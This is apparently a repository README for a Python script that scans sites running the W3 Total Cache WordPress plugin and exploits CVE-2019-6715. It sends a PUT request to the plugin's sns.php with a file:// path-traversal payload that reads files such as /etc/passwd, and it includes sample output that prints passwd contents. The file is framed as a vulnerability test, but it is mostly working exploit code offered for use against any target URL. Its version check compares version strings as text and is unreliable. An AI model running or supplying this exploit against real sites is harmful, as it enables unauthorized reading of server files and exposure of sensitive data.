# W3TotalChache
Testing for CVE-2019-6715 (Arbitrary File Read)/ CVE-2024-12365 (SSRF/Info Disclosure)

usage:
python3 w3tc_scanner.py -u https://example.com -f /etc/passwd -d 3

import requests
import argparse
from urllib.parse import urlparse

def check_w3tc_version(url):
    try:
        response = requests.get(url, timeout=10)
        headers = response.headers
        
        # Check X-Powered-By header
        if 'X-Powered-By' in headers and 'W3 Total Cache' in headers['X-Powered-By']:
            version = headers['X-Powered-By'].split('/')[-1]
            return version
        
        # Check HTML content for version
        if 'W3 Total Cache' in response.text:
            version = response.text.split('W3 Total Cache/')[-1].split()[0][:5]
            return version
            
        return None
    except Exception as e:
        print(f"Version check error: {str(e)}")
        return None

def test_file_read(target_url, file_path="/etc/passwd", depth=2):
    try:
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        traversal = '../' * depth
        exploit_url = f"{base_url}/wp-content/plugins/w3-total-cache/pub/sns.php"
        
        payload = {
            "Type": "SubscriptionConfirmation",
            "Message": "",
            "SubscribeURL": f"file:///{traversal}{file_path}"
        }
        
        headers = {'Content-Type': 'application/json'}
        response = requests.put(exploit_url, json=payload, headers=headers, timeout=15)
        
        if response.status_code == 200 and len(response.text) > 0:
            return True, response.text
        return False, None
        
    except Exception as e:
        print(f"File read test error: {str(e)}")
        return False, None

def main():
    parser = argparse.ArgumentParser(description='W3 Total Cache Vulnerability Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-f', '--file', default="/etc/passwd", 
                      help='File to read (default: /etc/passwd)')
    parser.add_argument('-d', '--depth', type=int, default=2,
                      help='Traversal depth (default: 2)')
    
    args = parser.parse_args()
    
    print(f"[*] Scanning {args.url}")
    
    # Version check
    version = check_w3tc_version(args.url)
    if version:
        print(f"[!] Detected W3 Total Cache version: {version}")
        if version <= "2.8.1":
            print("[!] Vulnerable to CVE-2024-12365 (SSRF/Info Disclosure)")
    else:
        print("[!] W3 Total Cache not detected through headers/content")
    
    # File read vulnerability test
    print("\n[*] Testing for CVE-2019-6715 (Arbitrary File Read)...")
    vulnerable, content = test_file_read(args.url, args.file, args.depth)
    
    if vulnerable:
        print(f"[!] Vulnerable to directory traversal!\nFile content:\n{content[:500]}...")
    else:
        print("[+] No immediate file read vulnerability detected")

if __name__ == "__main__":
    main()

Output:
[*] Scanning https://example.com
[!] Detected W3 Total Cache version: 2.8.0
[!] Vulnerable to CVE-2024-12365 (SSRF/Info Disclosure)

[*] Testing for CVE-2019-6715 (Arbitrary File Read)...
[!] Vulnerable to directory traversal!
File content:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
